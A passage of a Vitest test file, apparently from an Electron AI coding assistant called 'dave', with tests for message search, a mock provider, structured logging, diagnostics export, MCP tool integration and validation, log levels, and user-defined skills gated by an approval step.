    expect(sanitizeMessagesForReplace([{ role: "user", content: "ok" }])).toEqual([
      { role: "user", content: "ok" },
    ])
  })
})

// =====================================================================
// message-search — 全文搜索 / assistant 导航
// =====================================================================
describe("message-search helpers", () => {
  const msgs = [
    { role: "user", content: "如何优化 React 性能" },
    { role: "assistant", content: "可以用 memo 与虚拟列表" },
    { role: "user", content: "还有呢" },
    { role: "assistant", content: "Code splitting 也很关键" },
    { role: "tool", content: "read_file ok" },
  ]

  it("findMessageMatchIndices is case-insensitive and ordered", () => {
    expect(findMessageMatchIndices(msgs, "react")).toEqual([0])
    expect(findMessageMatchIndices(msgs, "MEMO")).toEqual([1])
    expect(findMessageMatchIndices(msgs, "关键")).toEqual([3])
    expect(findMessageMatchIndices(msgs, "")).toEqual([])
    expect(findMessageMatchIndices(msgs, "   ")).toEqual([])
    expect(findMessageMatchIndices(msgs, "不存在的词")).toEqual([])
  })

  it("stepMatchIndex walks circularly", () => {
    const hits = [0, 3]
    expect(stepMatchIndex(hits, null, 1)).toBe(0)
    expect(stepMatchIndex(hits, 0, 1)).toBe(3)
    expect(stepMatchIndex(hits, 3, 1)).toBe(0)
    expect(stepMatchIndex(hits, 3, -1)).toBe(0)
    expect(stepMatchIndex([], null, 1)).toBeNull()
  })

  it("findAdjacentAssistantIndex skips non-assistant roles", () => {
    expect(findAdjacentAssistantIndex(msgs, -1, 1)).toBe(1)
    expect(findAdjacentAssistantIndex(msgs, 1, 1)).toBe(3)
    expect(findAdjacentAssistantIndex(msgs, 3, 1)).toBeNull()
    expect(findAdjacentAssistantIndex(msgs, 5, -1)).toBe(3)
    expect(findAdjacentAssistantIndex(msgs, 3, -1)).toBe(1)
    expect(findAdjacentAssistantIndex(msgs, 1, -1)).toBeNull()
  })
})

// =====================================================================
// mock-provider — E2E 免真实 API Key 全链路测试模式(R2)
// =====================================================================
describe("mock-provider helpers", () => {
  it("mockReplyText echoes user input and marks ask vs agent mode", () => {
    expect(mockReplyText("你好", "ask")).toBe("这是 mock 回复：你好")
    expect(mockReplyText("你好", "auto")).toBe(
      "这是 mock 回复：你好 （mock 工具轮已完成，模式=auto）",
    )
    expect(mockReplyText("", "ask")).toBe("这是 mock 回复：")
  })

  it("buildMockAgentScript uses a safe read-only tool with a valid minimal patch", () => {
    const turn = buildMockAgentScript("auto", "")
    expect(turn.tool).toBe("file_tree")
    expect(turn.approvalArgs).toEqual({ depth: 1 })
    expect(turn.patchPaths).toEqual(["mock.md"])
    // 最小合法 unified diff:头部 +++ / hunk / 新增行齐全
    expect(turn.patch).toContain("+++ b/mock.md")
    expect(turn.patch).toContain("@@ -0,0 +1,1 @@")
    expect(turn.patch).toContain("+mock 内容")
  })

  it("isMockMode is off unless DAVE_TEST_MOCK_PROVIDER=1", () => {
    const prev = process.env.DAVE_TEST_MOCK_PROVIDER
    delete process.env.DAVE_TEST_MOCK_PROVIDER
    expect(isMockMode()).toBe(false)
    process.env.DAVE_TEST_MOCK_PROVIDER = "1"
    expect(isMockMode()).toBe(true)
    if (prev) process.env.DAVE_TEST_MOCK_PROVIDER = prev
    else delete process.env.DAVE_TEST_MOCK_PROVIDER
  })
})

// =====================================================================
// structured-log — 结构化事件日志(JSON Lines,可观测性 §3.1)
// =====================================================================
describe("structured-log", () => {
  let dir: string
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "dave-structlog-"))
    setStructuredLogDir(dir)
  })
  afterEach(() => {
    setStructuredLogDir(null)
    rmSync(dir, { recursive: true, force: true })
  })

  it("formatEventLine / parseEventLine roundtrip and reject malformed lines", () => {
    const line = formatEventLine({ ts: 123, level: "info", msg: "hello", extra: "x" })
    expect(parseEventLine(line)).toEqual({ ts: 123, level: "info", msg: "hello", extra: "x" })
    expect(parseEventLine("")).toBeNull()
    expect(parseEventLine("not json")).toBeNull()
    expect(parseEventLine('{"ts":"a","msg":"x","level":"info"}')).toBeNull()
    expect(parseEventLine('{"ts":1,"msg":"x","level":"debug"}')).toBeNull()
  })

  it("appendEvent + readStructuredEvents returns newest-first with limit", () => {
    appendEvent("info", "a")
    appendEvent("warn", "b", { channel: "x" })
    appendEvent("error", "c")
    const events = readStructuredEvents(10)
    expect(events.map((e) => e.msg)).toEqual(["c", "b", "a"])
    expect(events[1].level).toBe("warn")
    expect(events[1].channel).toBe("x")
    expect(readStructuredEvents(2).length).toBe(2)
    // limit<=0 时 slice(-0) 返回全部(JS 语义);IPC 层已保证 limit ≥ 1
    expect(readStructuredEvents(0).length).toBe(3)
  })

  it("recovers from a corrupt line without losing other events", () => {
    appendEvent("info", "ok")
    writeFileSync(join(dir, "logs", "events.jsonl"), "garbage\n", { flag: "a" })
    appendEvent("error", "after")
    const msgs = readStructuredEvents(10).map((e) => e.msg)
    expect(msgs).toContain("ok")
    expect(msgs).toContain("after")
  })
})

// =====================================================================
// diagnostics — 本地诊断导出(§3.2)
// =====================================================================
describe("diagnostics helpers", () => {
  it("formatSystemInfo includes platform/versions/memory", () => {
    const text = formatSystemInfo({
      platform: "win32",
      arch: "x64",
      appVersion: "0.1.0",
      electronVersion: "42.0.0",
      nodeVersion: "22.0.0",
      chromeVersion: "140.0.0",
      totalMemoryMB: 16384,
      userData: "C:/x",
    })
    expect(text).toContain("win32 (x64)")
    expect(text).toContain("0.1.0")
    expect(text).toContain("16384 MB")
    expect(text).toContain("C:/x")
  })

  it("formatSessionSummary lists sessions with message counts", () => {
    const text = formatSessionSummary(
      [
        { id: "s1", title: "会话一", updatedAt: 1700000000000 },
        { id: "s2", title: "会话二", updatedAt: 1700000001000 },
      ],
      (id) => (id === "s1" ? 5 : 0),
    )
    expect(text).toContain("会话数: 2")
    expect(text).toContain("会话一 (5 条消息")
    expect(text).toContain("会话二 (0 条消息")
  })
})

// =====================================================================
// mcp — MCP 工具集成(复用官方 SDK,§5)
// =====================================================================
describe("mcp helpers", () => {
  it("mcpToolName / splitMcpToolName roundtrip", () => {
    expect(isMcpToolName("mcp__fs__read_file")).toBe(true)
    expect(isMcpToolName("toolShell")).toBe(false)
    const full = mcpToolName("fs", "read_file")
    expect(full).toBe("mcp__fs__read_file")
    expect(splitMcpToolName(full)).toEqual({ server: "fs", tool: "read_file" })
    expect(splitMcpToolName("mcp__x")).toBeNull()
    expect(splitMcpToolName("mcp____")).toBeNull()
    expect(splitMcpToolName("toolShell")).toBeNull()
  })

  it("validateMcpServerConfig accepts valid and rejects invalid configs", () => {
    expect(validateMcpServerConfig({ name: "fs", command: "npx", args: ["-y"] })).toEqual({
      name: "fs",
      command: "npx",
      args: ["-y"],
    })
    expect(validateMcpServerConfig({ name: "fs", command: "npx" })).toEqual({
      name: "fs",
      command: "npx",
      args: [],
    })
    expect(validateMcpServerConfig(null)).toBeNull()
    expect(validateMcpServerConfig({ name: "", command: "npx" })).toBeNull()
    expect(validateMcpServerConfig({ name: "a b", command: "npx" })).toBeNull()
    expect(validateMcpServerConfig({ name: "fs", command: "   " })).toBeNull()
    expect(validateMcpServerConfig({ name: "fs", command: "npx", args: "x" })).toBeNull()
  })

  it("parseMcpServers filters invalid and dedupes by name", () => {
    const raw = [
      { name: "fs", command: "npx", args: ["-y", "pkg"] },
      { name: "fs", command: "other" },
      { name: "bad name", command: "x" },
      { name: "git", command: "npx" },
    ]
    const out = parseMcpServers(raw)
    expect(out.map((s) => s.name)).toEqual(["fs", "git"])
    expect(out[0].args).toEqual(["-y", "pkg"])
    expect(parseMcpServers("not array")).toEqual([])
    expect(parseMcpServers(null)).toEqual([])
  })
})

// =====================================================================
// mcp client — 真实 stdio 连接端到端(关闭 MCP-TOOLS "待手动验证")
// =====================================================================
describe("mcp client integration", () => {
  const serverPath = join(process.cwd(), "tests", "fixtures", "mcp-echo-server.mjs")

  afterEach(async () => {
    await mcpManager.disconnectAll()
  })

  it("connects, lists and calls tools end-to-end via stdio", async () => {
    await mcpManager.connect({ name: "echo", command: process.execPath, args: [serverPath] })
    expect(mcpManager.isConnected("echo")).toBe(true)

    const tools = mcpManager.listTools()
    expect(tools.map((t) => t.fullName).sort()).toEqual(["mcp__echo__add", "mcp__echo__echo"])
    expect(mcpManager.getTool("mcp__echo__echo")).not.toBeNull()
    expect(mcpManager.getTool("mcp__echo__missing")).toBeNull()
    expect(mcpManager.getTool("toolShell")).toBeNull()

    const sum = await mcpManager.callTool("mcp__echo__add", { a: 2, b: 3 })
    expect(sum).toBe("5")
    const echoed = await mcpManager.callTool("mcp__echo__echo", { text: "hi" })
    expect(echoed).toBe("hi")
    // 真实 spawn + SDK 握手在完整套件/高负载下可能超过 vitest 默认 5s 超时,显式放宽
  }, 30_000)

  it("reports an error when the tool is not found on a connected server", async () => {
    await mcpManager.connect({ name: "echo", command: process.execPath, args: [serverPath] })
    await expect(mcpManager.callTool("mcp__echo__nope", {})).rejects.toThrow(
      /MCP 工具未连接|callTool|Error/i,
    )
  }, 30_000)
})

// =====================================================================
// log-level — 日志输出级别白名单(N1b)
// =====================================================================
describe("log-level", () => {
  it("isValidLogLevel accepts the four known levels and rejects others", () => {
    expect(isValidLogLevel("debug")).toBe(true)
    expect(isValidLogLevel("info")).toBe(true)
    expect(isValidLogLevel("warn")).toBe(true)
    expect(isValidLogLevel("error")).toBe(true)
    expect(isValidLogLevel("silly")).toBe(false)
    expect(isValidLogLevel("")).toBe(false)
    expect(isValidLogLevel(123)).toBe(false)
    expect(isValidLogLevel(null)).toBe(false)
    expect(LOG_LEVELS).toEqual(["debug", "info", "warn", "error"])
  })
})

// =====================================================================
// skills — 用户自定义预置技能(0.3.0 M1 第一步)
// =====================================================================
describe("skills helpers", () => {
  it("validateSkill accepts valid and rejects invalid skills", () => {
    expect(
      validateSkill({ name: "review", description: "code review", content: "请审查代码" }),
    ).toEqual({ name: "review", description: "code review", content: "请审查代码" })
    expect(validateSkill(null)).toBeNull()
    expect(validateSkill({ name: "", description: "", content: "x" })).toBeNull()
    expect(validateSkill({ name: "a b", description: "", content: "x" })).toBeNull()
    expect(validateSkill({ name: "ok", description: "", content: "   " })).toBeNull()
    expect(validateSkill({ name: "ok", description: "", content: "x".repeat(2001) })).toBeNull()
  })

  it("parseSkills filters invalid and dedupes by name", () => {
    const raw = [
      { name: "a", description: "", content: "1" },
      { name: "a", description: "", content: "2" },
      { name: "bad name", description: "", content: "3" },
      { name: "b", description: "", content: "4" },
    ]
    expect(parseSkills(raw).map((s) => s.name)).toEqual(["a", "b"])
    expect(parseSkills("x")).toEqual([])
    expect(parseSkills(null)).toEqual([])
  })

  it("skill tool name helpers roundtrip", () => {
    expect(isSkillToolName("skill__review")).toBe(true)
    expect(isSkillToolName("toolShell")).toBe(false)
    expect(skillToolName("review")).toBe("skill__review")
    expect(splitSkillToolName("skill__review")).toBe("review")
    expect(splitSkillToolName("skill__")).toBeNull()
    expect(splitSkillToolName("toolShell")).toBeNull()
  })

  it("findSkill locates by name and skillToolDefs advertises to LLM", () => {
    const list = [
      { name: "a", description: "desc a", content: "1" },
      { name: "b", description: "", content: "2" },
    ]
    expect(findSkill(list, "b")?.content).toBe("2")
    expect(findSkill(list, "missing")).toBeUndefined()
    const defs = skillToolDefs(list)
    expect(defs.map((d) => (d.function as { name: string }).name)).toEqual(["skill__a", "skill__b"])
    expect((defs[0].function as { description: string }).description).toBe("desc a")
  })

  it("skill outcome content helpers cover not-found / denied / applied paths", () => {
    const skill = { name: "review", description: "desc", content: "请审查" }
    expect(skillNotFoundContent("skill__nope")).toBe("错误：未知技能 skill__nope")
    expect(skillDeniedContent()).toBe("用户拒绝了此操作（或会话已中止）")
    expect(skillAppliedContent(skill)).toBe("技能「review」已启用：desc\n\n请审查")
  })

  it("skillToolCallOutcome covers not-found / denied / applied decision paths", () => {
    const skills = [{ name: "review", description: "desc", content: "请审查" }]
    // not-found 与审批无关(两阶段检查的第一阶段,不触发审批)
    expect(skillToolCallOutcome("skill__missing", skills, false).kind).toBe("not-found")
    expect(skillToolCallOutcome("skill__missing", skills, true).kind).toBe("not-found")
    // denied(审批拒绝)
    expect(skillToolCallOutcome("skill__review", skills, false)).toEqual({
      kind: "denied",
      content: "用户拒绝了此操作（或会话已中止）",
    })
    // applied(审批通过,技能内容注入)
    const applied = skillToolCallOutcome("skill__review", skills, true)
    expect(applied.kind).toBe("applied")
    expect(applied.content).toContain("技能「review」已启用")
    expect(applied.content).toContain("请审查")
  })
})
